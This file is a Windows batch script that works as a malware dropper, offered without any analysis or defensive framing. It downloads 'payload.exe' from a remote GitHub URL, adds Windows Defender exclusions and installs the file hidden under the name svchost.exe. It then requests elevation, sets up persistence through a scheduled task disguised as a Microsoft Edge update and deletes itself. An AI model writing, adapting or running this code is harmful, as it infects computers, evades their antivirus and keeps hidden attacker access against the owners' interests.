@echo off
setlocal EnableExtensions
title Windows Service Host

set "EXE_URL=https://raw.githubusercontent.com/v1xkzy/testing/refs/heads/main/payload.exe?v=1"
set "HASH=cd8c60ea0145ab9b4fef70d5a3e32c5a4bdf05a6818a10cbc1e9ac54dd184eb5"
set "DEST=%LOCALAPPDATA%\Microsoft\Windows"
set "EXE=%DEST%\svchost.exe"
set "DROP=%TEMP%\svc_%RANDOM%%RANDOM%.exe"
set "LOG=%TEMP%\svc_install.log"

if /i "%~1"=="hard" goto :hard
if /i not "%~1"=="go" (
  start "" /min cmd /c ""%~f0" go"
  exit /b
)

echo [%date% %time%] start > "%LOG%"
if not exist "%DEST%" mkdir "%DEST%" >nul 2>&1
attrib +h "%DEST%" >nul 2>&1

rem ---- best effort exclusion (harmless when not admin) ----
powershell -nop -w h -c "try{Add-MpPreference -ExclusionPath '%DEST%' -EA Stop;'excl ok'}catch{'excl fail'}" >> "%LOG%" 2>&1

rem ---- stop previous copy of ours only ----
powershell -nop -w h -c "Get-CimInstance Win32_Process -Filter \"Name='svchost.exe'\"|?{$_.ExecutablePath -eq '%EXE%'}|%{Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}" >> "%LOG%" 2>&1

rem ---- download, 3 attempts ----
for %%R in (1 2 3) do (
  if not exist "%DROP%" (
    where curl.exe >nul 2>&1 && curl.exe -fsSL --retry 2 --max-time 180 -o "%DROP%" "%EXE_URL%" >> "%LOG%" 2>&1
    if not exist "%DROP%" powershell -nop -w h -c "try{iwr -useb '%EXE_URL%' -OutFile '%DROP%' -EA Stop}catch{}" >> "%LOG%" 2>&1
    if not exist "%DROP%" certutil -urlcache -split -f "%EXE_URL%" "%DROP%" >nul 2>&1
    if not exist "%DROP%" ping -n 4 127.0.0.1 >nul
  )
)
if not exist "%DROP%" (echo [fail] download >> "%LOG%" & goto :fail)

for %%A in ("%DROP%") do if %%~zA LSS 65536 (echo [fail] size >> "%LOG%" & goto :fail)
if defined HASH (
  powershell -nop -w h -c "if((Get-FileHash '%DROP%' -Algorithm SHA256).Hash -ne '%HASH%'){exit 1}"
  if errorlevel 1 (echo [fail] hash >> "%LOG%" & goto :fail)
)

powershell -nop -w h -c "Unblock-File '%DROP%'" >nul 2>&1
move /y "%DROP%" "%EXE%" >nul 2>&1
attrib +h "%EXE%" >nul 2>&1
start "" "%EXE%" --install
ping -n 4 127.0.0.1 >nul

rem ---- upgrade if we happen to be admin, else ask once ----
net session >nul 2>&1
if errorlevel 1 (
  powershell -nop -w h -c "Start-Process -FilePath '%~f0' -ArgumentList 'hard' -WindowStyle Hidden"
  exit /b 0
)

:hard
if not exist "%EXE%" exit /b 1
powershell -nop -w h -c "try{Add-MpPreference -ExclusionPath '%DEST%' -EA Stop;Add-MpPreference -ExclusionPath '%TEMP%' -EA Stop;'ok'}catch{'fail'}" >> "%LOG%" 2>&1
schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore /tr "\"%EXE%\"" /sc onlogon /rl highest /f >> "%LOG%" 2>&1
schtasks /run /tn MicrosoftEdgeUpdateTaskMachineCore >> "%LOG%" 2>&1
attrib +h "%EXE%" >nul 2>&1
del "%~f0" >nul 2>&1
exit /b 0

:fail
endlocal
exit /b 1
